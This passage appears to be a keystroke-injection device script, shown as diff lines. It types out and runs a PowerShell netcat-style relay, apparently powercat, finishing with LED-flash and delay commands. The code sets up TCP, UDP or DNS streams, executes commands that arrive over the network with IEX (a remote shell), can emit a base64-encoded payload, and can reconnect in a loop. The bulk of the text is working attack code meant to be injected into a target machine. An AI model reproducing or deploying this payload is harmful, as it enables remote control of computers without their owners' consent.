+STRINGLN   function ReadData_CMD
+STRINGLN   {
+STRINGLN     param($FuncVars)
+STRINGLN     [byte[]]$Data = @()
+STRINGLN     if($FuncVars["StdOutReadOperation"].IsCompleted)
+STRINGLN     {
+STRINGLN       $StdOutBytesRead = $FuncVars["Process"].StandardOutput.BaseStream.EndRead($FuncVars["StdOutReadOperation"])
+STRINGLN       if($StdOutBytesRead -eq 0){break}
+STRINGLN       $Data += $FuncVars["StdOutDestinationBuffer"][0..([int]$StdOutBytesRead-1)]
+STRINGLN       $FuncVars["StdOutReadOperation"] = $FuncVars["Process"].StandardOutput.BaseStream.BeginRead($FuncVars["StdOutDestinationBuffer"], 0, 65536, $null, $null)
+STRINGLN     }
+STRINGLN     if($FuncVars["StdErrReadOperation"].IsCompleted)
+STRINGLN     {
+STRINGLN       $StdErrBytesRead = $FuncVars["Process"].StandardError.BaseStream.EndRead($FuncVars["StdErrReadOperation"])
+STRINGLN       if($StdErrBytesRead -eq 0){break}
+STRINGLN       $Data += $FuncVars["StdErrDestinationBuffer"][0..([int]$StdErrBytesRead-1)]
+STRINGLN       $FuncVars["StdErrReadOperation"] = $FuncVars["Process"].StandardError.BaseStream.BeginRead($FuncVars["StdErrDestinationBuffer"], 0, 65536, $null, $null)
+STRINGLN     }
+STRINGLN     return $Data,$FuncVars
+STRINGLN   }
+STRINGLN   function WriteData_CMD
+STRINGLN   {
+STRINGLN     param($Data,$FuncVars)
+STRINGLN     $FuncVars["Process"].StandardInput.WriteLine($FuncVars["Encoding"].GetString($Data).TrimEnd("`r").TrimEnd("`n"))
+STRINGLN     return $FuncVars
+STRINGLN   }
+STRINGLN   function Close_CMD
+STRINGLN   {
+STRINGLN     param($FuncVars)
+STRINGLN     $FuncVars["Process"] | Stop-Process
+STRINGLN   }  
+STRINGLN   ########## CMD FUNCTIONS ##########
+STRINGLN   
+STRINGLN   ########## POWERSHELL FUNCTIONS ##########
+STRINGLN   function Main_Powershell
+STRINGLN   {
+STRINGLN     param($Stream1SetupVars)   
+STRINGLN     try
+SWCOLOR_14 153 255 0
+STRINGLN     {
+STRINGLN       $encoding = New-Object System.Text.AsciiEncoding
+STRINGLN       [byte[]]$InputToWrite = @()
+STRINGLN       if($i -ne $null)
+STRINGLN       {
+STRINGLN         Write-Verbose "Input from -i detected..."
+STRINGLN         if(Test-Path $i){ [byte[]]$InputToWrite = ([io.file]::ReadAllBytes($i)) }
+STRINGLN         elseif($i.GetType().Name -eq "Byte[]"){ [byte[]]$InputToWrite = $i }
+STRINGLN         elseif($i.GetType().Name -eq "String"){ [byte[]]$InputToWrite = $Encoding.GetBytes($i) }
+STRINGLN         else{Write-Host "Unrecognised input type." ; return}
+STRINGLN       }
+STRINGLN     
+STRINGLN       Write-Verbose "Setting up Stream 1... (ESC/CTRL to exit)"
+STRINGLN       try{$Stream1Vars = Stream1_Setup $Stream1SetupVars}
+STRINGLN       catch{Write-Verbose "Stream 1 Setup Failure" ; return}
+STRINGLN       
+STRINGLN       Write-Verbose "Setting up Stream 2... (ESC/CTRL to exit)"
+STRINGLN       try
+STRINGLN       {
+STRINGLN         $IntroPrompt = $Encoding.GetBytes("Windows PowerShell`nCopyright (C) 2013 Microsoft Corporation. All rights reserved.`n`n" + ("PS " + (pwd).Path + "> "))
+STRINGLN         $Prompt = ("PS " + (pwd).Path + "> ")
+STRINGLN         $CommandToExecute = ""      
+STRINGLN         $Data = $null
+STRINGLN       }
+STRINGLN       catch
+STRINGLN       {
+STRINGLN         Write-Verbose "Stream 2 Setup Failure" ; return
+STRINGLN       }
+STRINGLN       
+STRINGLN       if($InputToWrite -ne @())
+STRINGLN       {
+STRINGLN         Write-Verbose "Writing input to Stream 1..."
+STRINGLN         try{$Stream1Vars = Stream1_WriteData $InputToWrite $Stream1Vars}
+STRINGLN         catch{Write-Host "Failed to write input to Stream 1" ; return}
+STRINGLN       }
+STRINGLN       
+STRINGLN       if($d){Write-Verbose "-d (disconnect) Activated. Disconnecting..." ; return}
+STRINGLN       
+STRINGLN       Write-Verbose "Both Communication Streams Established. Redirecting Data Between Streams..."
+STRINGLN       while($True)
+STRINGLN       {        
+STRINGLN         try
+STRINGLN         {
+STRINGLN           ##### Stream2 Read #####
+STRINGLN           $Prompt = $null
+STRINGLN           $ReturnedData = $null
+STRINGLN           if($CommandToExecute -ne "")
+STRINGLN           {
+STRINGLN             try{[byte[]]$ReturnedData = $Encoding.GetBytes((IEX $CommandToExecute 2>&1 | Out-String))}
+STRINGLN             catch{[byte[]]$ReturnedData = $Encoding.GetBytes(($_ | Out-String))}
+STRINGLN             $Prompt = $Encoding.GetBytes(("PS " + (pwd).Path + "> "))
+STRINGLN           }
+STRINGLN           $Data += $IntroPrompt
+STRINGLN           $IntroPrompt = $null
+STRINGLN           $Data += $ReturnedData
+STRINGLN           $Data += $Prompt
+STRINGLN           $CommandToExecute = ""
+STRINGLN           ##### Stream2 Read #####
+STRINGLN 
+STRINGLN           if($Data -ne $null){$Stream1Vars = Stream1_WriteData $Data $Stream1Vars}
+STRINGLN           $Data = $null
+STRINGLN         }
+STRINGLN         catch
+STRINGLN         {
+STRINGLN           Write-Verbose "Failed to redirect data from Stream 2 to Stream 1" ; return
+STRINGLN         }
+STRINGLN         
+STRINGLN         try
+STRINGLN         {
+STRINGLN           $Data,$Stream1Vars = Stream1_ReadData $Stream1Vars
+STRINGLN           if($Data.Length -eq 0){Start-Sleep -Milliseconds 100}
+STRINGLN           if($Data -ne $null){$CommandToExecute = $Encoding.GetString($Data)}
+STRINGLN           $Data = $null
+STRINGLN         }
+STRINGLN         catch
+STRINGLN         {
+STRINGLN           Write-Verbose "Failed to redirect data from Stream 1 to Stream 2" ; return
+STRINGLN         }
+STRINGLN       }
+STRINGLN     }
+STRINGLN     finally
+STRINGLN     {
+STRINGLN       try
+STRINGLN       {
+STRINGLN         Write-Verbose "Closing Stream 1..."
+STRINGLN         Stream1_Close $Stream1Vars
+STRINGLN       }
+STRINGLN       catch
+STRINGLN       {
+STRINGLN         Write-Verbose "Failed to close Stream 1"
+STRINGLN       }
+STRINGLN     }
+STRINGLN   }
+STRINGLN   ########## POWERSHELL FUNCTIONS ##########
+STRINGLN 
+STRINGLN   ########## CONSOLE FUNCTIONS ##########
+STRINGLN   function Setup_Console
+STRINGLN   {
+STRINGLN     param($FuncSetupVars)
+SWCOLOR_15 102 255 0
+STRINGLN     $FuncVars = @{}
+STRINGLN     $FuncVars["Encoding"] = New-Object System.Text.AsciiEncoding
+STRINGLN     $FuncVars["Output"] = $FuncSetupVars[0]
+STRINGLN     $FuncVars["OutputBytes"] = [byte[]]@()
+STRINGLN     $FuncVars["OutputString"] = ""
+STRINGLN     return $FuncVars
+STRINGLN   }
+STRINGLN   function ReadData_Console
+STRINGLN   {
+STRINGLN     param($FuncVars)
+STRINGLN     $Data = $null
+STRINGLN     if($Host.UI.RawUI.KeyAvailable)
+STRINGLN     {
+STRINGLN       $Data = $FuncVars["Encoding"].GetBytes((Read-Host) + "`n")
+STRINGLN     }
+STRINGLN     return $Data,$FuncVars
+STRINGLN   }
+STRINGLN   function WriteData_Console
+STRINGLN   {
+STRINGLN     param($Data,$FuncVars)
+STRINGLN     switch($FuncVars["Output"])
+STRINGLN     {
+STRINGLN       "Host" {Write-Host -n $FuncVars["Encoding"].GetString($Data)}
+STRINGLN       "String" {$FuncVars["OutputString"] += $FuncVars["Encoding"].GetString($Data)}
+STRINGLN       "Bytes" {$FuncVars["OutputBytes"] += $Data}
+STRINGLN     }
+STRINGLN     return $FuncVars
+STRINGLN   }
+STRINGLN   function Close_Console
+STRINGLN   {
+STRINGLN     param($FuncVars)
+STRINGLN     if($FuncVars["OutputString"] -ne ""){return $FuncVars["OutputString"]}
+STRINGLN     elseif($FuncVars["OutputBytes"] -ne @()){return $FuncVars["OutputBytes"]}
+STRINGLN     return
+STRINGLN   }
+STRINGLN   ########## CONSOLE FUNCTIONS ##########
+STRINGLN   
+STRINGLN   ########## MAIN FUNCTION ##########
+STRINGLN   function Main
+STRINGLN   {
+STRINGLN     param($Stream1SetupVars,$Stream2SetupVars)
+STRINGLN     try
+STRINGLN     {
+STRINGLN       [byte[]]$InputToWrite = @()
+STRINGLN       $Encoding = New-Object System.Text.AsciiEncoding
+STRINGLN       if($i -ne $null)
+STRINGLN       {
+STRINGLN         Write-Verbose "Input from -i detected..."
+STRINGLN         if(Test-Path $i){ [byte[]]$InputToWrite = ([io.file]::ReadAllBytes($i)) }
+STRINGLN         elseif($i.GetType().Name -eq "Byte[]"){ [byte[]]$InputToWrite = $i }
+STRINGLN         elseif($i.GetType().Name -eq "String"){ [byte[]]$InputToWrite = $Encoding.GetBytes($i) }
+STRINGLN         else{Write-Host "Unrecognised input type." ; return}
+STRINGLN       }
+STRINGLN       
+STRINGLN       Write-Verbose "Setting up Stream 1..."
+STRINGLN       try{$Stream1Vars = Stream1_Setup $Stream1SetupVars}
+STRINGLN       catch{Write-Verbose "Stream 1 Setup Failure" ; return}
+STRINGLN       
+STRINGLN       Write-Verbose "Setting up Stream 2..."
+STRINGLN       try{$Stream2Vars = Stream2_Setup $Stream2SetupVars}
+STRINGLN       catch{Write-Verbose "Stream 2 Setup Failure" ; return}
+STRINGLN       
+STRINGLN       $Data = $null
+STRINGLN       
+STRINGLN       if($InputToWrite -ne @())
+STRINGLN       {
+STRINGLN         Write-Verbose "Writing input to Stream 1..."
+STRINGLN         try{$Stream1Vars = Stream1_WriteData $InputToWrite $Stream1Vars}
+STRINGLN         catch{Write-Host "Failed to write input to Stream 1" ; return}
+STRINGLN       }
+STRINGLN       
+STRINGLN       if($d){Write-Verbose "-d (disconnect) Activated. Disconnecting..." ; return}
+STRINGLN       
+STRINGLN       Write-Verbose "Both Communication Streams Established. Redirecting Data Between Streams..."
+STRINGLN       while($True)
+STRINGLN       {
+STRINGLN         try
+STRINGLN         {
+STRINGLN           $Data,$Stream2Vars = Stream2_ReadData $Stream2Vars
+STRINGLN           if(($Data.Length -eq 0) -or ($Data -eq $null)){Start-Sleep -Milliseconds 100}
+STRINGLN           if($Data -ne $null){$Stream1Vars = Stream1_WriteData $Data $Stream1Vars}
+STRINGLN           $Data = $null
+STRINGLN         }
+STRINGLN         catch
+STRINGLN         {
+STRINGLN           Write-Verbose "Failed to redirect data from Stream 2 to Stream 1" ; return
+STRINGLN         }
+STRINGLN         
+STRINGLN         try
+STRINGLN         {
+STRINGLN           $Data,$Stream1Vars = Stream1_ReadData $Stream1Vars
+STRINGLN           if(($Data.Length -eq 0) -or ($Data -eq $null)){Start-Sleep -Milliseconds 100}
+STRINGLN           if($Data -ne $null){$Stream2Vars = Stream2_WriteData $Data $Stream2Vars}
+STRINGLN           $Data = $null
+STRINGLN         }
+STRINGLN         catch
+STRINGLN         {
+STRINGLN           Write-Verbose "Failed to redirect data from Stream 1 to Stream 2" ; return
+SWCOLOR_15 51 255 0
+STRINGLN         }
+STRINGLN       }
+STRINGLN     }
+STRINGLN     finally
+STRINGLN     {
+STRINGLN       try
+STRINGLN       {
+STRINGLN         #Write-Verbose "Closing Stream 2..."
+STRINGLN         Stream2_Close $Stream2Vars
+STRINGLN       }
+STRINGLN       catch
+STRINGLN       {
+STRINGLN         Write-Verbose "Failed to close Stream 2"
+STRINGLN       }
+STRINGLN       try
+STRINGLN       {
+STRINGLN         #Write-Verbose "Closing Stream 1..."
+STRINGLN         Stream1_Close $Stream1Vars
+STRINGLN       }
+STRINGLN       catch
+STRINGLN       {
+STRINGLN         Write-Verbose "Failed to close Stream 1"
+STRINGLN       }
+STRINGLN     }
+STRINGLN   }
+STRINGLN   ########## MAIN FUNCTION ##########
+STRINGLN   
+STRINGLN   ########## GENERATE PAYLOAD ##########
+STRINGLN   if($u)
+STRINGLN   {
+STRINGLN     Write-Verbose "Set Stream 1: UDP"
+STRINGLN     $FunctionString = ("function Stream1_Setup`n{`n" + ${function:Setup_UDP} + "`n}`n`n")
+STRINGLN     $FunctionString += ("function Stream1_ReadData`n{`n" + ${function:ReadData_UDP} + "`n}`n`n")
+STRINGLN     $FunctionString += ("function Stream1_WriteData`n{`n" + ${function:WriteData_UDP} + "`n}`n`n")
+STRINGLN     $FunctionString += ("function Stream1_Close`n{`n" + ${function:Close_UDP} + "`n}`n`n")    
+STRINGLN     if($l){$InvokeString = "Main @('',`$True,'$p','$t') "}
+STRINGLN     else{$InvokeString = "Main @('$c',`$False,'$p','$t') "}
+STRINGLN   }
+STRINGLN   elseif($dns -ne "")
+STRINGLN   {
+STRINGLN     Write-Verbose "Set Stream 1: DNS"
+STRINGLN     $FunctionString = ("function Stream1_Setup`n{`n" + ${function:Setup_DNS} + "`n}`n`n")
+STRINGLN     $FunctionString += ("function Stream1_ReadData`n{`n" + ${function:ReadData_DNS} + "`n}`n`n")
+STRINGLN     $FunctionString += ("function Stream1_WriteData`n{`n" + ${function:WriteData_DNS} + "`n}`n`n")
+STRINGLN     $FunctionString += ("function Stream1_Close`n{`n" + ${function:Close_DNS} + "`n}`n`n")
+STRINGLN     if($l){return "This feature is not available."}
+STRINGLN     else{$InvokeString = "Main @('$c','$p','$dns',$dnsft) "}
+STRINGLN   }
+STRINGLN   else
+STRINGLN   {
+STRINGLN     Write-Verbose "Set Stream 1: TCP"
+STRINGLN     $FunctionString = ("function Stream1_Setup`n{`n" + ${function:Setup_TCP} + "`n}`n`n")
+STRINGLN     $FunctionString += ("function Stream1_ReadData`n{`n" + ${function:ReadData_TCP} + "`n}`n`n")
+STRINGLN     $FunctionString += ("function Stream1_WriteData`n{`n" + ${function:WriteData_TCP} + "`n}`n`n")
+STRINGLN     $FunctionString += ("function Stream1_Close`n{`n" + ${function:Close_TCP} + "`n}`n`n")
+STRINGLN     if($l){$InvokeString = "Main @('',`$True,$p,$t) "}
+STRINGLN     else{$InvokeString = "Main @('$c',`$False,$p,$t) "}
+STRINGLN   }
+STRINGLN   
+STRINGLN   if($e -ne "")
+STRINGLN   {
+STRINGLN     Write-Verbose "Set Stream 2: Process"
+STRINGLN     $FunctionString += ("function Stream2_Setup`n{`n" + ${function:Setup_CMD} + "`n}`n`n")
+STRINGLN     $FunctionString += ("function Stream2_ReadData`n{`n" + ${function:ReadData_CMD} + "`n}`n`n")
+STRINGLN     $FunctionString += ("function Stream2_WriteData`n{`n" + ${function:WriteData_CMD} + "`n}`n`n")
+STRINGLN     $FunctionString += ("function Stream2_Close`n{`n" + ${function:Close_CMD} + "`n}`n`n")
+STRINGLN     $InvokeString += "@('$e')`n`n"
+STRINGLN   }
+STRINGLN   elseif($ep)
+STRINGLN   {
+STRINGLN     Write-Verbose "Set Stream 2: Powershell"
+STRINGLN     $InvokeString += "`n`n"
+STRINGLN   }
+STRINGLN   elseif($r -ne "")
+STRINGLN   {
+STRINGLN     if($r.split(":")[0].ToLower() -eq "udp")
+STRINGLN     {
+STRINGLN       Write-Verbose "Set Stream 2: UDP"
+STRINGLN       $FunctionString += ("function Stream2_Setup`n{`n" + ${function:Setup_UDP} + "`n}`n`n")
+STRINGLN       $FunctionString += ("function Stream2_ReadData`n{`n" + ${function:ReadData_UDP} + "`n}`n`n")
+STRINGLN       $FunctionString += ("function Stream2_WriteData`n{`n" + ${function:WriteData_UDP} + "`n}`n`n")
+STRINGLN       $FunctionString += ("function Stream2_Close`n{`n" + ${function:Close_UDP} + "`n}`n`n")    
+STRINGLN       if($r.split(":").Count -eq 2){$InvokeString += ("@('',`$True,'" + $r.split(":")[1] + "','$t') ")}
+STRINGLN       elseif($r.split(":").Count -eq 3){$InvokeString += ("@('" + $r.split(":")[1] + "',`$False,'" + $r.split(":")[2] + "','$t') ")}
+STRINGLN       else{return "Bad relay format."}
+STRINGLN     }
+STRINGLN     if($r.split(":")[0].ToLower() -eq "dns")
+STRINGLN     {
+STRINGLN       Write-Verbose "Set Stream 2: DNS"
+STRINGLN       $FunctionString += ("function Stream2_Setup`n{`n" + ${function:Setup_DNS} + "`n}`n`n")
+STRINGLN       $FunctionString += ("function Stream2_ReadData`n{`n" + ${function:ReadData_DNS} + "`n}`n`n")
+STRINGLN       $FunctionString += ("function Stream2_WriteData`n{`n" + ${function:WriteData_DNS} + "`n}`n`n")
+STRINGLN       $FunctionString += ("function Stream2_Close`n{`n" + ${function:Close_DNS} + "`n}`n`n")
+STRINGLN       if($r.split(":").Count -eq 2){return "This feature is not available."}
+STRINGLN       elseif($r.split(":").Count -eq 4){$InvokeString += ("@('" + $r.split(":")[1] + "','" + $r.split(":")[2] + "','" + $r.split(":")[3] + "',$dnsft) ")}
+STRINGLN       else{return "Bad relay format."}
+STRINGLN     }
+STRINGLN     elseif($r.split(":")[0].ToLower() -eq "tcp")
+STRINGLN     {
+SWCOLOR_15 2 255 0
+STRINGLN       Write-Verbose "Set Stream 2: TCP"
+STRINGLN       $FunctionString += ("function Stream2_Setup`n{`n" + ${function:Setup_TCP} + "`n}`n`n")
+STRINGLN       $FunctionString += ("function Stream2_ReadData`n{`n" + ${function:ReadData_TCP} + "`n}`n`n")
+STRINGLN       $FunctionString += ("function Stream2_WriteData`n{`n" + ${function:WriteData_TCP} + "`n}`n`n")
+STRINGLN       $FunctionString += ("function Stream2_Close`n{`n" + ${function:Close_TCP} + "`n}`n`n")
+STRINGLN       if($r.split(":").Count -eq 2){$InvokeString += ("@('',`$True,'" + $r.split(":")[1] + "','$t') ")}
+STRINGLN       elseif($r.split(":").Count -eq 3){$InvokeString += ("@('" + $r.split(":")[1] + "',`$False,'" + $r.split(":")[2] + "','$t') ")}
+STRINGLN       else{return "Bad relay format."}
+STRINGLN     }
+STRINGLN   }
+STRINGLN   else
+STRINGLN   {
+STRINGLN     Write-Verbose "Set Stream 2: Console"
+STRINGLN     $FunctionString += ("function Stream2_Setup`n{`n" + ${function:Setup_Console} + "`n}`n`n")
+STRINGLN     $FunctionString += ("function Stream2_ReadData`n{`n" + ${function:ReadData_Console} + "`n}`n`n")
+STRINGLN     $FunctionString += ("function Stream2_WriteData`n{`n" + ${function:WriteData_Console} + "`n}`n`n")
+STRINGLN     $FunctionString += ("function Stream2_Close`n{`n" + ${function:Close_Console} + "`n}`n`n")
+STRINGLN     $InvokeString += ("@('" + $o + "')")
+STRINGLN   }
+STRINGLN   
+STRINGLN   if($ep){$FunctionString += ("function Main`n{`n" + ${function:Main_Powershell} + "`n}`n`n")}
+STRINGLN   else{$FunctionString += ("function Main`n{`n" + ${function:Main} + "`n}`n`n")}
+STRINGLN   $InvokeString = ($FunctionString + $InvokeString)
+STRINGLN   ########## GENERATE PAYLOAD ##########
+STRINGLN   
+STRINGLN   ########## RETURN GENERATED PAYLOADS ##########
+STRINGLN   if($ge){Write-Verbose "Returning Encoded Payload..." ; return [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($InvokeString))}
+STRINGLN   elseif($g){Write-Verbose "Returning Payload..." ; return $InvokeString}
+STRINGLN   ########## RETURN GENERATED PAYLOADS ##########
+STRINGLN   
+STRINGLN   ########## EXECUTION ##########
+STRINGLN   $Output = $null
+STRINGLN   try
+STRINGLN   {
+STRINGLN     if($rep)
+STRINGLN     {
+STRINGLN       while($True)
+STRINGLN       {
+STRINGLN         $Output += IEX $InvokeString
+STRINGLN         Start-Sleep -s 2
+STRINGLN         Write-Verbose "Repetition Enabled: Restarting..."
+STRINGLN       }
+STRINGLN     }
+STRINGLN     else
+STRINGLN     {
+STRINGLN       $Output += IEX $InvokeString
+STRINGLN     }
+STRINGLN   }
+STRINGLN   finally
+STRINGLN   {
+STRINGLN     if($Output -ne $null)
+STRINGLN     {
+STRINGLN       if($of -eq ""){$Output}
+STRINGLN       else{[io.file]::WriteAllBytes($of,$Output)}
+STRINGLN     }
+STRINGLN   }
+STRINGLN   ########## EXECUTION ##########
+STRINGLN }
+ENTER
+SWCOLOR_13 0 128 255
+SWCOLOR_14 0 128 255
+SWCOLOR_15 0 128 255
+DELAY 300
+SWCOLOR_13 255 255 255
+SWCOLOR_14 255 255 255
+SWCOLOR_15 255 255 255
+DELAY 300
+SWCOLOR_13 0 128 255
+SWCOLOR_14 0 128 255
+SWCOLOR_15 0 128 255
+DELAY 300
+SWCOLOR_13 255 255 255
+SWCOLOR_14 255 255 255
+SWCOLOR_15 255 255 255
+DELAY 300
+SWCOLOR_13 0 128 255
+SWCOLOR_14 0 128 255
+SWCOLOR_15 0 128 255
+DELAY 300
+SWCOLOR_13 0 0 0
+SWCOLOR_14 0 0 0
+SWCOLOR_15 0 0 0
